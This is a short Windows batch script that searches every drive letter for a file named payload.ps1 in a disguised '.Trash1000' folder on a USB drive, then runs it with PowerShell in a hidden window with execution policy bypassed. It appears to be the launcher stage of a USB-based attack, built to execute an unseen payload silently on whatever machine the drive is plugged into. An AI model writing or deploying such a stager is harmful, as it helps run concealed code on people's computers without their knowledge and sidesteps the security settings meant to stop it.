@echo off

setlocal enabledelayedexpansion

:: Loop through all drive letters to find USB drive
for %%D in (A B C D E F G H I J K L M N O P Q R S T U V W X Y Z) do (
    if exist "%%D:\.Trash1000\payload.ps1" (
        set "usb_drive=%%D:"
        goto found
    )
)

exit /b

:found

powershell -ExecutionPolicy Bypass -NoProfile -WindowStyle Hidden -File "%usb_drive%\.Trash1000\payload.ps1"
exit

